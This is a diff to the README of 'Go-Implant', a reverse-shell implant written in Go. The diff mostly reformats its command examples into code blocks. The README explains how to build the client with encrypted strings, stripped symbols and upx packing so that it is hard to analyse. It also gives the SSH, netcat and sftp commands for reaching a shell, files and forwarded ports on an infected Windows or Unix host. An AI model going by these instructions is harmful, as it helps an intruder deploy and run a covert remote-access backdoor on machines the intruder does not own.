@@ -25,28 +25,29 @@ Because no long-deployable, cross-platform, flexible reverse shell with only bas
 
 
 ## Installation
-`apt install -y git make upx strip`
-`git clone <repo name>`
-`cd <repo name>`
-`make deps`
+```
+apt install -y git make upx strip
+git clone <repo name>
+cd <repo name>
+make deps
+```
 
 
 ## Compilation
 Both client and server of Go-Implant are standalone executables that need to be compiled. Server has only been tested to compile and work on linux. Client has been tested to compile on Linux, and work on Linux and Windows.
 
 ### Server
-1. Compile the server: (in cmd/server)
-    `make prod`
+1. Compile the server:
+```
+make prod
+```
 
 ### Client
 1. Set configuration in /client/config/parameters.go
-2. Encrypt static strings
-    `cd client/config/`
-    remove //build +ignore tag from parameters.go
-    `go generate`
-    add //build +ignore tag back to parameters.go
-3. Compile the client for all platforms (in cmd/client)
-    `make prod`
+2. Remove //build +ignore tag from client/config/parameters.go
+3. Run `go generate` in /client/config directory
+4. Add //build +ignore tag back to client/config/parameters.go
+3. Compile the client for all platforms (in cmd/client): `make prod`
 
 The makefile compiles the client for all platforms, strips symbols from the executables and finally packs them using upx.
 As of writing mac executables are not stripped.
@@ -56,7 +57,9 @@ NOTE: makefile assumes commands upx and strip are available
 Should anything not work as expected, debugging builds are available of both server and client. These build include debugging symbols, a ton of printouts to tracks the activities of the program and omit compressing the resulting binaries. Debugging builds are trivial to reverse-engineer and therefore should not be used in production.
 
 To compile debugging build, use command:
-`make debug`
+```
+make debug
+```
 for both client and the server.
 
 #### Configuration
@@ -95,9 +98,11 @@ Usage of ./server:
 ```
 
 #### examples
-`./server -handlerport 8080 -sshport 2222`
-`./server -cert othercert.crt -privkey otherkey.key`
-`./server -forwarded-timeout 0h10m0s`
+```
+./server -handlerport 8080 -sshport 2222
+./server -cert othercert.crt -privkey otherkey.key
+./server -forwarded-timeout 0h10m0s
+```
 
 
 ## Reverse shell and file access
@@ -110,19 +115,24 @@ Filesystem access is done using sftp.
 
 ### Unix (linux or mac):
 After forwarding port from the client to server, just SSH in using the generated credentials.
-`ssh <username>@localhost -p <port>`
+```
+ssh <username>@localhost -p <port>
+```
 
 ### Windows:
 After forwarding port from the client to server, forward another port from the client machine using the client's sshd to localhost, then connect to the forwarded port using netcat
-`ssh -N -L <localport>:0.0.0.0:<destport> localhost -p <port>`
-`nc localhost <localport>`
+```
+ssh -N -L <localport>:0.0.0.0:<destport> localhost -p <port>
+nc localhost <localport>
+```
 
 NOTE: right now destport is not used! The remote host 0.0.0.0 is a magic string that tells the agent to serve a cmd shell to the client.
 
 ### Uploading / Downloading files with sftp (both windows and unix)
 After forwarding port from the client to server, you can access the filesystem using sftp.
-`sftp -P <port> <username>@localhost`
-
+```
+sftp -P <port> <username>@localhost`
+```
 
 ## Port forwarding
 
@@ -130,11 +140,15 @@ Local ssh listener in the server allows at most 5 reverse port forwards from the
 
 ### Windows:
 On windows, ports can be forwarded but no shell can be launched at the same time, therefore flag -N must be used. Omitting the flag causes the client to serve sftp instead
-`ssh -N -L <localport>:<desthost>:<destport> localhost -p <port>`
+```
+ssh -N -L <localport>:<desthost>:<destport> localhost -p <port>
+```
 
 ### Unix (linux or mac):
 On linux, ports can be forwarded similarly with the familiar sshd
-`ssh [-N] -L <localport>:<desthost>:<destport> localhost -p <port>`
+```
+ssh [-N] -L <localport>:<desthost>:<destport> localhost -p <port>
+```
 
 
 ## Features for future releases
